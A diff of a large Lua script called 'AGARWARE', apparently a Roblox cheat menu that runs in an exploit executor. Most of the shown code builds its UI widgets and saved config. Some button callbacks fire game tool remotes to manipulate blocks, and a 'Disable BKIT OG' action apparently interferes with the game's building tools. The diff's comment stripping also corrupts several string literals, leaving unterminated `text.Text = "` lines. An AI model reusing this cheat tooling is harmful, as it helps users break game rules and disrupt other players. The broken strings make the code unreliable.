 					return "No block created!"
 				end
-	
 				block = playerfolder:GetChildren()[#playerfolder:GetChildren()]
-	
 				if painttool then
 					if block.Material ~= Enum.Material.Plastic then
 						painttool.Script.Event:FireServer(
@@ -11152,7 +10244,6 @@ local script = AGARWARE["352"];
 						)
 						task.wait(ws * 2)
 					end
-	
 					if not block.Anchored or block.CFrame - block.Position ~= CFrame.new() then
 						local l = tick()
 						repeat
@@ -11172,46 +10263,37 @@ local script = AGARWARE["352"];
 						until block.Anchored and block.CFrame - block.Position == CFrame.new()
 					end
 				end
-	
 				if shapetool then
 					local blockpos = block.Position
 					blockpos = Vector3.new(blockpos.X % 4, blockpos.Y % 4, blockpos.Z % 4)
 					blockpos = blockpos - Vector3.new(0.5, 0.5, 0.5)
-	
 					for i = 1, blockpos.X do
 						shapetool.Script.Event:FireServer(block, Enum.NormalId.Left, block.Position, "increase")
 						task.wait(0.15)
 					end
-	
 					for i = 1, 3 - blockpos.X do
 						shapetool.Script.Event:FireServer(block, Enum.NormalId.Right, block.Position, "increase")
 						task.wait(0.15)
 					end
-	
 					for i = 1, blockpos.Y do
 						shapetool.Script.Event:FireServer(block, Enum.NormalId.Bottom, block.Position, "increase")
 						task.wait(0.15)
 					end
-	
 					for i = 1, 3 - blockpos.Y do
 						shapetool.Script.Event:FireServer(block, Enum.NormalId.Top, block.Position, "increase")
 						task.wait(0.15)
 					end
-	
 					for i = 1, blockpos.Z do
 						shapetool.Script.Event:FireServer(block, Enum.NormalId.Front, block.Position, "increase")
 						task.wait(0.15)
 					end
-	
 					for i = 1, 3 - blockpos.Z do
 						shapetool.Script.Event:FireServer(block, Enum.NormalId.Back, block.Position, "increase")
 						task.wait(0.15)
 					end
 				end
-	
 				return true
 			end)
-	
 			if success and result == true then
 				_G.SetButtonText("restorebrick", "Restored brick!", 1)
 				return true
@@ -11224,19 +10306,6 @@ local script = AGARWARE["352"];
 			end
 		end,
 	})
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	-- ====================================================================================================
-	-- DISABLE BKIT OG
-	-- ====================================================================================================
 	_G.CreateButton({
 		frame = "disablebkitog",
 		groupbox = script,
@@ -11256,16 +10325,12 @@ local script = AGARWARE["352"];
 				local rs = game:GetService("ReplicatedStorage")
 				local character = LocalPlayer.Character
 				if not character then error("No character") end
-	
-				-- Refresh the delete tool first
 				if shared.RefreshTool then
 					shared.RefreshTool("Delete")
 					task.wait(0.1)
 				end
-	
 				local deleteTool = LocalPlayer.Backpack:FindFirstChild("Delete") or character:FindFirstChild("Delete")
 				if not deleteTool then error("Delete tool needed!") end
-	
 				local hrp = character:FindFirstChild("HumanoidRootPart")
 				if not hrp then error("No HumanoidRootPart") end
 				local cube = rs:FindFirstChild("Cube")
@@ -11299,7 +10364,6 @@ task.spawn(C_352);
 local function C_3b2()
 local script = AGARWARE["3b2"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -11326,14 +10390,6 @@ local script = AGARWARE["3b2"];
 		end
 		updateSize()
 	end
-	
-	
-	
-	-- ====================================================================================================
-	-- GROUPBOX/TAB CONFIGS
-	-- ====================================================================================================
-	
-	
 	_G.CreateToggle({
 		frame = "mutemusic",
 		groupbox = script,
@@ -11353,7 +10409,6 @@ task.spawn(C_3b2);
 local function C_3c6()
 local script = AGARWARE["3c6"];
 	repeat task.wait() until _G.CreateToggle and _G.CreateButton and _G.CreateButtonToggle and _G.CreateTextbox
-	
 	local groupbox = script.Parent
 	local uiListLayout = groupbox:FindFirstChildOfClass("UIListLayout")
 	local function getScreenGui()
@@ -11388,7 +10443,6 @@ local script = AGARWARE["3e1"];
 	local textLabel = script.Parent
 	local brightBlue = Color3.fromRGB(0, 123, 255)
 	local darkBlue = Color3.fromRGB(0, 75, 149)
-	
 	while true do
 		local toDark = TweenService:Create(
 			textLabel,
@@ -11413,8 +10467,6 @@ local script = AGARWARE["3e4"];
 	local textLabel = script.Parent
 	local brightBlue = Color3.fromRGB(0, 123, 255)
 	local darkBlue = Color3.fromRGB(0, 75, 149)
-	
-	-- Text animation loop
 	task.spawn(function()
 		local frames = {
 			"> discord.gg/7fDasxV2Ht <",
@@ -11429,8 +10481,6 @@ local script = AGARWARE["3e4"];
 			task.wait(0.3)
 		end
 	end)
-	
-	-- Color animation loop
 	while true do
 		local toDark = TweenService:Create(
 			textLabel,
@@ -11513,7 +10563,7 @@ end;
 task.spawn(C_3ea);
 local function C_3f2()
 local script = AGARWARE["3f2"];
-	-- ToggleMaster Script
+	
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -11521,29 +10571,21 @@ local script = AGARWARE["3f2"];
 			p = p.Parent
 		end
 	end
-	
 	local screenGui = getScreenGui()
 	if not screenGui then return end
-	
 	local UserInputService = game:GetService("UserInputService")
 	local HttpService = game:GetService("HttpService")
-	
 	local colorFrame = screenGui:FindFirstChild("Color")
 	if not colorFrame then return end
-	
 	local targetColor = colorFrame.BackgroundColor3
 	local toggleStates = {}
-	
 	_G.ConfigData = _G.ConfigData or {}
-	
 	local CONFIG_FILE = "myconfig.json"
-	
 	local function saveConfig()
 		pcall(function()
 			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
 		end)
 	end
-	
 	local function loadConfig()
 		local success, data = pcall(function()
 			return readfile(CONFIG_FILE)
@@ -11552,12 +10594,9 @@ local script = AGARWARE["3f2"];
 			_G.ConfigData = HttpService:JSONDecode(data)
 		end
 	end
-	
 	loadConfig()
-	
 	local allToggles = {}
 	local allButtonToggles = {}
-	
 	local function updateAllColors()
 		targetColor = colorFrame.BackgroundColor3
 		for _, toggle in pairs(allToggles) do
@@ -11567,40 +10606,29 @@ local script = AGARWARE["3f2"];
 			buttonToggle.update()
 		end
 	end
-	
 	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
-	
 	local function CreateToggle(config)
 		local frameName = config.frame
 		local groupboxScript = config.groupbox
 		local tooltipText = config.tooltip
 		local callback = config.callback
-	
 		local frame = groupboxScript.Parent:FindFirstChild(frameName)
 		if not frame then return end
-	
 		local button = frame:FindFirstChild("button")
 		if not button then return end
-	
 		local toggleFrame = button:FindFirstChild("toggleFrame")
 		if not toggleFrame then return end
-	
 		local outlineStroke = toggleFrame:FindFirstChild("outlineStroke")
 		if not outlineStroke then return end
-	
 		local toggleFade = toggleFrame:FindFirstChild("toggleFade")
-	
 		local isToggled = _G.ConfigData[frameName] or false
 		local isHovering = false
 		toggleStates[button] = isToggled
-		
-		-- Call callback on load if toggled is true
 		if isToggled and callback then
 			task.spawn(function()
 				callback(true)
 			end)
 		end
-	
 		local function updateVisuals()
 			if isToggled then
 				toggleFrame.BackgroundColor3 = targetColor
@@ -11623,14 +10651,10 @@ local script = AGARWARE["3f2"];
 					outlineStroke.Transparency = 0
 				end
 			end
-	
 			outlineStroke.ZIndex = isHovering and 99 or 1
 		end
-	
 		updateVisuals()
-	
 		table.insert(allToggles, {update = updateVisuals})
-	
 		button.MouseButton1Click:Connect(function()
 			isToggled = not isToggled
 			toggleStates[button] = isToggled
@@ -11641,7 +10665,6 @@ local script = AGARWARE["3f2"];
 				callback(isToggled)
 			end
 		end)
-	
 		button.MouseEnter:Connect(function()
 			isHovering = true
 			outlineStroke.Color = targetColor
@@ -11660,7 +10683,6 @@ local script = AGARWARE["3f2"];
 				_G.ShowTooltip(tooltipText)
 			end
 		end)
-	
 		button.MouseLeave:Connect(function()
 			isHovering = false
 			updateVisuals()
@@ -11669,7 +10691,6 @@ local script = AGARWARE["3f2"];
 			end
 		end)
 	end
-	
 	local function CreateButtonToggle(config)
 		local frameName = config.frame
 		local groupboxScript = config.groupbox
@@ -11677,23 +10698,17 @@ local script = AGARWARE["3f2"];
 		local callback = config.callback
 		local toggledText = config.toggledText
 		local toggledTextColor = config.toggledTextColor or targetColor
-	
 		local frame = groupboxScript.Parent:FindFirstChild(frameName)
 		if not frame then return end
-	
 		local button = frame:FindFirstChild("button")
 		if not button then return end
-	
 		local outlineStroke = button:FindFirstChild("outlineStroke", true)
 		local text = button:FindFirstChild("text")
-	
 		if not text then return end
-	
 		local isToggled = _G.ConfigData[frameName] or false
 		local originalText = text.Text
 		local originalTextColor = text.TextColor3
 		local isHovering = false
-	
 		local function updateVisuals()
 			local currentToggledTextColor = config.toggledTextColor or targetColor
 			if isToggled then
@@ -11727,23 +10742,18 @@ local script = AGARWARE["3f2"];
 				end
 			end
 		end
-	
 		updateVisuals()
-	
 		table.insert(allButtonToggles, {update = updateVisuals})
-	
 		button.MouseButton1Down:Connect(function()
 			if not isToggled then
 				text.TextColor3 = targetColor
 			end
 		end)
-	
 		button.MouseButton1Up:Connect(function()
 			if not isToggled then
 				text.TextColor3 = originalTextColor
 			end
 		end)
-	
 		button.MouseButton1Click:Connect(function()
 			isToggled = not isToggled
 			_G.ConfigData[frameName] = isToggled
@@ -11753,7 +10763,6 @@ local script = AGARWARE["3f2"];
 				callback(isToggled)
 			end
 		end)
-	
 		if outlineStroke and outlineStroke:IsA("UIStroke") then
 			button.MouseEnter:Connect(function()
 				isHovering = true
@@ -11773,7 +10782,6 @@ local script = AGARWARE["3f2"];
 					_G.ShowTooltip(tooltipText)
 				end
 			end)
-	
 			button.MouseLeave:Connect(function()
 				isHovering = false
 				updateVisuals()
@@ -11783,14 +10791,13 @@ local script = AGARWARE["3f2"];
 			end)
 		end
 	end
-	
 	_G.CreateToggle = CreateToggle
 	_G.CreateButtonToggle = CreateButtonToggle
 end;
 task.spawn(C_3f2);
 local function C_3f3()
 local script = AGARWARE["3f3"];
-	-- ButtonMaster Script
+	
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -11798,18 +10805,13 @@ local script = AGARWARE["3f3"];
 			p = p.Parent
 		end
 	end
-	
 	local screenGui = getScreenGui()
 	if not screenGui then return end
-	
 	local UserInputService = game:GetService("UserInputService")
 	local RunService = game:GetService("RunService")
-	
 	local colorFrame = screenGui:FindFirstChild("Color")
 	if not colorFrame then return end
-	
 	local targetColor = colorFrame.BackgroundColor3
-	
 	local function CreateButton(config)
 		local frameName = config.frame
 		local groupboxScript = config.groupbox
@@ -11826,29 +10828,22 @@ local script = AGARWARE["3f3"];
 		local holdText = config.holdtext
 		local holdVisual = config.holdvisual or false
 		local holdTextColor = config.holdtextcolor
-	
 		local frame = groupboxScript.Parent:FindFirstChild(frameName)
 		if not frame then return end
-	
 		local button = frame:FindFirstChild("button")
 		if not button then return end
-	
 		local outlineStroke = button:FindFirstChild("outlineStroke", true)
 		local text = button:FindFirstChild("text")
-	
 		if not text then return end
-	
 		local originalText = text.Text
 		local originalTextColor = text.TextColor3
 		local isConfirming = false
 		local confirmTask = nil
 		local isProcessing = false
-	
 		local holding = false
 		local holdProgress = 0
 		local holdConnection = nil
 		local fillBar = button:FindFirstChild("fillbar")
-	
 		local holdColor = targetColor
 		if holdTextColor then
 			if holdTextColor == "frameColor" then
@@ -11860,7 +10855,6 @@ local script = AGARWARE["3f3"];
 				end
 			end
 		end
-	
 		local function stopHold()
 			holding = false
 			if holdConnection then
@@ -11874,7 +10868,6 @@ local script = AGARWARE["3f3"];
 			text.Text = originalText
 			text.TextColor3 = originalTextColor
 		end
-	
 		local function executeCallback()
 			isProcessing = true
 			local success = true
@@ -11884,9 +10877,7 @@ local script = AGARWARE["3f3"];
 					success = result
 				end
 			end
-	
 			local messageToShow = success and afterMessage or errorMessage
-	
 			if messageToShow then
 				local displayText = messageToShow
 				if messageToShow:find("%%%.%df") then
@@ -11915,10 +10906,8 @@ local script = AGARWARE["3f3"];
 				isProcessing = false
 			end
 		end
-	
 		button.MouseButton1Down:Connect(function()
 			if isProcessing and not canClickDuringAfter then return end
-	
 			if holdTime then
 				holding = true
 				holdProgress = 0
@@ -11926,23 +10915,19 @@ local script = AGARWARE["3f3"];
 					text.Text = holdText
 				end
 				text.TextColor3 = holdColor
-	
 				holdConnection = RunService.RenderStepped:Connect(function(dt)
 					if not holding then return end
 					holdProgress = holdProgress + (dt / holdTime)
 					holdProgress = math.clamp(holdProgress, 0, 1)
-	
 					if fillBar and holdVisual then
 						fillBar.Size = UDim2.new(holdProgress, 0, 1, 0)
 					end
-	
 					if holdText and holdText:find("%%%.%df") then
 						local remaining = math.max(0, holdTime - (holdProgress * holdTime))
 						text.Text = holdText:gsub("(%%%.%df)", function(match)
 							return string.format(match, remaining)
 						end)
 					end
-	
 					if holdProgress >= 1 then
 						stopHold()
 						if needsConfirm then
@@ -11963,7 +10948,6 @@ local script = AGARWARE["3f3"];
 				text.TextColor3 = targetColor
 			end
 		end)
-	
 		button.MouseButton1Up:Connect(function()
 			if holdTime then
 				stopHold()
@@ -11973,7 +10957,6 @@ local script = AGARWARE["3f3"];
 				end
 			end
 		end)
-	
 		button.MouseLeave:Connect(function()
 			if holdTime then
 				stopHold()
@@ -11983,11 +10966,9 @@ local script = AGARWARE["3f3"];
 				end
 			end
 		end)
-	
 		button.MouseButton1Click:Connect(function()
 			if holdTime then return end
 			if isProcessing and not canClickDuringAfter then return end
-	
 			if needsConfirm then
 				if isConfirming then
 					if confirmTask then task.cancel(confirmTask) end
@@ -12009,13 +10990,11 @@ local script = AGARWARE["3f3"];
 				executeCallback()
 			end
 		end)
-	
 		if outlineStroke and outlineStroke:IsA("UIStroke") then
 			local originalColor = outlineStroke.Color
 			local originalThickness = outlineStroke.Thickness
 			local originalTransparency = outlineStroke.Transparency
 			outlineStroke.ZIndex = 1
-			
 			button.MouseEnter:Connect(function()
 				outlineStroke.Color = targetColor
 				outlineStroke.Thickness = 1
@@ -12033,7 +11012,6 @@ local script = AGARWARE["3f3"];
 					_G.ShowTooltip(tooltipText)
 				end
 			end)
-	
 			button.MouseLeave:Connect(function()
 				outlineStroke.Color = originalColor
 				outlineStroke.Thickness = originalThickness
@@ -12045,25 +11023,15 @@ local script = AGARWARE["3f3"];
 			end)
 		end
 	end
-	
 	_G.CreateButton = CreateButton
-	
-	-- Store active cancel tokens per frame
 	local activeTokens = {}
-	
 	_G.SetButtonText = function(frameName, message, duration)
 		duration = duration or 2
-	
-		-- Cancel previous token for this frame
 		if activeTokens[frameName] then
 			activeTokens[frameName].cancelled = true
 		end
-	
-		-- Create new cancel token
 		local cancelToken = {cancelled = false}
 		activeTokens[frameName] = cancelToken
-	
-		-- Find all buttons with this frame name
 		for _, descendant in pairs(screenGui:GetDescendants()) do
 			if descendant.Name == frameName and descendant:IsA("Frame") then
 				local button = descendant:FindFirstChild("button")
@@ -12072,10 +11040,8 @@ local script = AGARWARE["3f3"];
 					if text then
 						local originalText = text.Text
 						local originalColor = text.TextColor3
-	
 						text.Text = message
 						text.TextColor3 = targetColor
-	
 						task.delay(duration, function()
 							if not cancelToken.cancelled then
 								text.Text = originalText
@@ -12088,14 +11054,13 @@ local script = AGARWARE["3f3"];
 				end
 			end
 		end
-	
 		return cancelToken
 	end
 end;
 task.spawn(C_3f3);
 local function C_3f4()
 local script = AGARWARE["3f4"];
-	-- TextboxMaster Script
+	
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -12110,18 +11075,14 @@ local script = AGARWARE["3f4"];
 	local colorFrame = screenGui:FindFirstChild("Color")
 	if not colorFrame then return end
 	local targetColor = colorFrame.BackgroundColor3
-	
 	local allTextboxes = {}
-	
 	local function updateAllColors()
 		targetColor = colorFrame.BackgroundColor3
 		for _, textbox in pairs(allTextboxes) do
 			textbox.update()
 		end
 	end
-	
 	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
-	
 	_G.ConfigData = _G.ConfigData or {}
 	local CONFIG_FILE = "myconfig.json"
 	local function saveConfig()
@@ -12152,7 +11113,6 @@ local script = AGARWARE["3f4"];
 		local textbox = textboxFrame:FindFirstChild("textbox")
 		if not textbox or not textbox:IsA("TextBox") then return end
 		local outlineStroke = textboxFrame:FindFirstChild("outlineStroke", true)
-	
 		local function getTextboxColor()
 			if textboxColor then
 				if textboxColor == "frameColor" then
@@ -12166,7 +11126,6 @@ local script = AGARWARE["3f4"];
 			end
 			return nil
 		end
-	
 		local function updateTextboxColor()
 			local color = getTextboxColor()
 			if color then
@@ -12174,15 +11133,11 @@ local script = AGARWARE["3f4"];
 				textbox.PlaceholderColor3 = color
 			end
 		end
-	
 		updateTextboxColor()
 		table.insert(allTextboxes, {update = updateTextboxColor})
-	
 		local configKey = frameName .. "_" .. textboxName
 		if _G.ConfigData[configKey] then
 			textbox.Text = _G.ConfigData[configKey]
-	
-			-- NEW: Actually run the callback with saved value
 			if callback then
 				task.spawn(function()
 					callback(_G.ConfigData[configKey])
@@ -12253,7 +11208,7 @@ end;
 task.spawn(C_3f4);
 local function C_3f5()
 local script = AGARWARE["3f5"];
-	-- SliderMaster Script
+	
 	local function getScreenGui()
 		local p = script.Parent
 		while p do
@@ -12261,40 +11216,29 @@ local script = AGARWARE["3f5"];
 			p = p.Parent
 		end
 	end
-	
 	local screenGui = getScreenGui()
 	if not screenGui then return end
-	
 	local UserInputService = game:GetService("UserInputService")
 	local RunService = game:GetService("RunService")
 	local HttpService = game:GetService("HttpService")
-	
 	local colorFrame = screenGui:FindFirstChild("Color")
 	if not colorFrame then return end
-	
 	local targetColor = colorFrame.BackgroundColor3
-	
 	local allSliders = {}
-	
 	local function updateAllColors()
 		targetColor = colorFrame.BackgroundColor3
 		for _, slider in pairs(allSliders) do
 			slider.update()
 		end
 	end
-	
 	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
-	
 	_G.ConfigData = _G.ConfigData or {}
-	
 	local CONFIG_FILE = "myconfig.json"
-	
 	local function saveConfig()
 		pcall(function()
 			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
 		end)
 	end
-	
 	local function loadConfig()
 		local success, data = pcall(function()
 			return readfile(CONFIG_FILE)
@@ -12303,9 +11247,7 @@ local script = AGARWARE["3f5"];
 			_G.ConfigData = HttpService:JSONDecode(data)
 		end
 	end
-	
 	loadConfig()
-	
 	local function CreateSlider(config)
 		local frameName = config.frame
 		local groupboxScript = config.groupbox
@@ -12317,41 +11259,29 @@ local script = AGARWARE["3f5"];
 		local decimalPlaces = config.decimalplaces or 0
 		local snap = config.snap or false
 		local defaultValue = config.default
-	
 		if not maxValue then return end
-	
 		local frame = groupboxScript.Parent:FindFirstChild(frameName)
 		if not frame then return end
-	
 		local button = frame:FindFirstChild("button")
 		if not button then return end
-	
 		local sliderFrame = button:FindFirstChild("sliderFrame")
 		if not sliderFrame then return end
-	
 		local fillBar = sliderFrame:FindFirstChild("fillbar")
 		local text = button:FindFirstChild("text")
 		local outlineStroke = sliderFrame:FindFirstChild("outlineStroke", true)
-	
 		if not fillBar or not text then return end
-	
 		fillBar.BackgroundColor3 = colorFrame.BackgroundColor3
-	
 		local function updateFillBarColor()
 			fillBar.BackgroundColor3 = colorFrame.BackgroundColor3
 		end
-	
 		table.insert(allSliders, {update = updateFillBarColor})
-	
 		local dragging = false
 		local currentValue = _G.ConfigData[frameName]
-	
 		if not currentValue then
 			currentValue = defaultValue or minValue
 			_G.ConfigData[frameName] = currentValue
 			saveConfig()
 		end
-	
 		local function formatValue(value)
 			if decimalPlaces == math.huge then
 				return tostring(value)
@@ -12359,74 +11289,58 @@ local script = AGARWARE["3f5"];
 				return string.format("%." .. decimalPlaces .. "f", value)
 			end
 		end
-	
 		local function updateSlider(value)
 			value = math.clamp(value, minValue, maxValue)
-	
 			if snap then
 				local snapIncrement = 10 ^ -decimalPlaces
 				value = math.floor(value / snapIncrement + 0.5) * snapIncrement
 			end
-	
 			if value >= maxValue and highestValue > maxValue then
 				value = highestValue
 			end
-	
 			currentValue = value
-	
 			local percentage = (value - minValue) / (maxValue - minValue)
 			fillBar.Size = UDim2.new(math.clamp(percentage, 0, 1), 0, 1, 0)
-	
 			if value >= maxValue and highestValue == math.huge then
 				text.Text = formatValue(minValue) .. " / inf"
 			else
 				text.Text = formatValue(value) .. " / " .. formatValue(maxValue)
 			end
-	
 			_G.ConfigData[frameName] = value
 			saveConfig()
-	
 			if callback then
 				callback(value)
 			end
 		end
-	
 		local function updateFromMouse(input)
 			local pos = sliderFrame.AbsolutePosition
 			local size = sliderFrame.AbsoluteSize
 			local mouseX = input.Position.X
-	
 			local percentage = math.clamp((mouseX - pos.X) / size.X, 0, 1)
 			local value = minValue + (percentage * (maxValue - minValue))
-	
 			updateSlider(value)
 		end
-	
 		sliderFrame.InputBegan:Connect(function(input)
 			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 				dragging = true
 				updateFromMouse(input)
 			end
 		end)
-	
 		sliderFrame.InputEnded:Connect(function(input)
 			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
 				dragging = false
 			end
 		end)
-	
 		UserInputService.InputChanged:Connect(function(input)
 			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
 				updateFromMouse(input)
 			end
 		end)
-	
 		if outlineStroke and outlineStroke:IsA("UIStroke") then
 			local originalColor = outlineStroke.Color
 			local originalThickness = outlineStroke.Thickness
 			local originalTransparency = outlineStroke.Transparency
 			outlineStroke.ZIndex = 1
-	
 			sliderFrame.MouseEnter:Connect(function()
 				outlineStroke.Color = targetColor
 				outlineStroke.Thickness = 1
@@ -12444,7 +11358,6 @@ local script = AGARWARE["3f5"];
 					_G.ShowTooltip(tooltipText)
 				end
 			end)
-	
 			sliderFrame.MouseLeave:Connect(function()
 				outlineStroke.Color = originalColor
 				outlineStroke.Thickness = originalThickness
@@ -12455,10 +11368,8 @@ local script = AGARWARE["3f5"];
 				end
 			end)
 		end
-	
 		updateSlider(currentValue)
 	end
-	
 	_G.CreateSlider = CreateSlider
 end;
 task.spawn(C_3f5);
@@ -12480,13 +11391,10 @@ local script = AGARWARE["3f6"];
 	local colorFrame = screenGui:FindFirstChild("Color")
 	if not colorFrame then return end
 	local targetColor = colorFrame.BackgroundColor3
-	
 	local function updateAllColors()
 		targetColor = colorFrame.BackgroundColor3
 	end
-	
 	colorFrame:GetPropertyChangedSignal("BackgroundColor3"):Connect(updateAllColors)
-	
 	_G.ConfigData = _G.ConfigData or {}
 	local CONFIG_FILE = "myconfig.json"
 	local function saveConfig()
@@ -12573,7 +11481,7 @@ local script = AGARWARE["3f6"];
 		elseif defaultSelection then
 			if defaultSelection == "none" then
 				selectedSingle = nil
-				text.Text = "--"
+				text.Text = "
 			elseif dropdownType == "custom" and not multiSelect then
 				selectedSingle = defaultSelection
 				_G.ConfigData[configKey] = defaultSelection
@@ -12590,7 +11498,7 @@ local script = AGARWARE["3f6"];
 				end
 				if count == 0 then
 					if defaultSelection == "none" then
-						text.Text = "--"
+						text.Text = "
 					else
 						text.Text = originalText
 					end
@@ -12611,7 +11519,7 @@ local script = AGARWARE["3f6"];
 					text.Text = selectedSingle
 				else
 					if defaultSelection == "none" then
-						text.Text = "--"
+						text.Text = "
 					else
 						text.Text = originalText
 					end
@@ -12966,8 +11874,6 @@ local script = AGARWARE["3f6"];
 			local originalThickness = outlineStroke.Thickness
 			local originalTransparency = outlineStroke.Transparency
 			outlineStroke.ZIndex = 1
-			-- DropdownMaster (OLD TOOLTIP SECTION)
-			-- Find this part in your DropdownMaster:
 			button.MouseEnter:Connect(function()
 				outlineStroke.Color = targetColor
 				outlineStroke.Thickness = 1
@@ -13045,28 +11951,20 @@ local script = AGARWARE["3f7"];
 			p = p.Parent
 		end
 	end
-	
 	local screenGui = getScreenGui()
 	if not screenGui then return end
-	
 	local UserInputService = game:GetService("UserInputService")
 	local HttpService = game:GetService("HttpService")
-	
 	local colorFrame = screenGui:FindFirstChild("Color")
 	if not colorFrame then return end
-	
 	local targetColor = colorFrame.BackgroundColor3
-	
 	_G.ConfigData = _G.ConfigData or {}
-	
 	local CONFIG_FILE = "myconfig.json"
-	
 	local function saveConfig()
 		pcall(function()
 			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
 		end)
 	end
-	
 	local function loadConfig()
 		local success, data = pcall(function()
 			return readfile(CONFIG_FILE)
@@ -13075,18 +11973,14 @@ local script = AGARWARE["3f7"];
 			_G.ConfigData = HttpService:JSONDecode(data)
 		end
 	end
-	
 	loadConfig()
-	
 	local mainColorPicker = screenGui:FindFirstChild("ColorPicker")
 	if not mainColorPicker then return end
-	
 	local activePickerButton = nil
 	local activeConfigKey = nil
 	local activeCallback = nil
 	local activeButtonColorFrame = nil
 	local activeButtonStroke = nil
-	
 	local function CreateColorPicker(config)
 		local frameName = config.frame
 		local colorPickerFrameName = config.colorpickerframe
@@ -13096,20 +11990,14 @@ local script = AGARWARE["3f7"];
 		local alphaEnabled = config.alpha ~= false
 		local defaultAlpha = config.defaultalpha or 0
 		local callback = config.callback
-	
 		local groupboxFrame = config.groupbox.Parent
 		local frame = groupboxFrame:FindFirstChild(frameName)
 		if not frame then return end
-	
 		local pickerButton = frame:FindFirstChild(colorPickerFrameName)
 		if not pickerButton then return end
-	
 		local buttonColorFrame = pickerButton:FindFirstChild("colorFrame")
 		if not buttonColorFrame then return end
-	
 		local buttonStroke = buttonColorFrame:FindFirstChild("UIStroke")
-	
-		-- Determine default color
 		local startColor = Color3.fromRGB(255, 255, 255)
 		if defaultColor == "frameColor" then
 			startColor = targetColor
@@ -13121,51 +12009,36 @@ local script = AGARWARE["3f7"];
 		elseif typeof(defaultColor) == "Color3" then
 			startColor = defaultColor
 		end
-	
-		-- Config key
 		local configKey = frameName .. "_" .. colorPickerFrameName
-	
-		-- Load saved color from config
 		if _G.ConfigData[configKey] then
 			local saved = _G.ConfigData[configKey]
 			startColor = Color3.fromRGB(saved.r, saved.g, saved.b)
 			defaultAlpha = saved.a or defaultAlpha
 		end
-	
-		-- Set initial button color
 		buttonColorFrame.BackgroundColor3 = startColor
 		if buttonStroke then
 			buttonStroke.Color = startColor
 		end
-	
-		-- Set title
 		if titleText then
 			local titleLabel = mainColorPicker.innerframelayout:FindFirstChild("text")
 			if titleLabel then
 				titleLabel.Text = titleText
 			end
 		end
-	
-		-- Hide/show transparency
 		local transparencyFrame = mainColorPicker.innerframelayout:FindFirstChild("transparency")
 		if transparencyFrame then
 			transparencyFrame.Visible = alphaEnabled
 		end
-	
-		-- Position picker under button or center
 		local function positionPicker()
 			if _G.CenterColorPicker then
-				-- Center on screen
 				local screenSize = screenGui.AbsoluteSize
 				local pickerSize = mainColorPicker.AbsoluteSize
 				mainColorPicker.Position = UDim2.new(0, (screenSize.X - pickerSize.X) / 2, 0, (screenSize.Y - pickerSize.Y) / 2)
 			else
-				-- Position under button
 				local isRightside = groupboxFrame.Name:lower():find("right")
 				local buttonPos = pickerButton.AbsolutePosition
 				local buttonSize = pickerButton.AbsoluteSize
 				local pickerSize = mainColorPicker.AbsoluteSize
-	
 				if isRightside then
 					mainColorPicker.Position = UDim2.new(0, buttonPos.X + buttonSize.X - pickerSize.X, 0, buttonPos.Y + buttonSize.Y)
 				else
@@ -13173,14 +12046,10 @@ local script = AGARWARE["3f7"];
 				end
 			end
 		end
-	
-		-- Click button to open/close picker
 		local RunService = game:GetService("RunService")
 		local updateConnection = nil
-	
 		pickerButton.MouseButton1Click:Connect(function()
 			if mainColorPicker.Visible and activePickerButton == pickerButton then
-				-- Close (act as cancel)
 				mainColorPicker.Visible = false
 				activePickerButton = nil
 				if updateConnection then
@@ -13188,26 +12057,19 @@ local script = AGARWARE["3f7"];
 					updateConnection = nil
 				end
 			else
-				-- Open
 				positionPicker()
 				mainColorPicker.Visible = true
 				activePickerButton = pickerButton
-	
-				-- Store active picker data
 				activeConfigKey = configKey
 				activeCallback = callback
 				activeButtonColorFrame = buttonColorFrame
 				activeButtonStroke = buttonStroke
-	
-				-- Update title
 				if titleText then
 					local titleLabel = mainColorPicker.innerframelayout:FindFirstChild("text")
 					if titleLabel then
 						titleLabel.Text = titleText
 					end
 				end
-	
-				-- Update transparency visibility
 				local transparencyFrame = mainColorPicker.innerframelayout:FindFirstChild("transparency")
 				if transparencyFrame then
 					transparencyFrame.Visible = alphaEnabled
@@ -13217,8 +12079,6 @@ local script = AGARWARE["3f7"];
 						mainColorPicker.Size = UDim2.new(0, 200, 0, 252)
 					end
 				end
-	
-				-- Continuously update position while open
 				if updateConnection then
 					updateConnection:Disconnect()
 				end
@@ -13232,15 +12092,11 @@ local script = AGARWARE["3f7"];
 						end
 					end
 				end)
-	
-				-- Set picker to current button color
 				if _G.SetColorPickerColor then
 					_G.SetColorPickerColor(buttonColorFrame.BackgroundColor3, defaultAlpha)
 				end
 			end
 		end)
-	
-		-- Tooltip
 		if tooltipText then
 			pickerButton.MouseEnter:Connect(function()
 				if _G.ShowTooltip then
@@ -13262,17 +12118,12 @@ local script = AGARWARE["3f7"];
 			end)
 		end
 	end
-	
 	_G.CreateColorPicker = CreateColorPicker
-	
-	-- Apply button (connected ONCE for all colorpickers)
 	local applyButton = mainColorPicker.innerframelayout.applycancel.apply
 	applyButton.MouseButton1Click:Connect(function()
 		if not activePickerButton then return end
-	
 		if _G.GetColorPickerColor then
 			local selectedColor, selectedAlpha = _G.GetColorPickerColor()
-	
 			if activeButtonColorFrame then
 				activeButtonColorFrame.BackgroundColor3 = selectedColor
 				activeButtonColorFrame.BackgroundTransparency = 0
@@ -13280,7 +12131,6 @@ local script = AGARWARE["3f7"];
 			if activeButtonStroke then
 				activeButtonStroke.Color = selectedColor
 			end
-	
 			if activeConfigKey then
 				_G.ConfigData[activeConfigKey] = {
 					r = math.floor(selectedColor.R * 255),
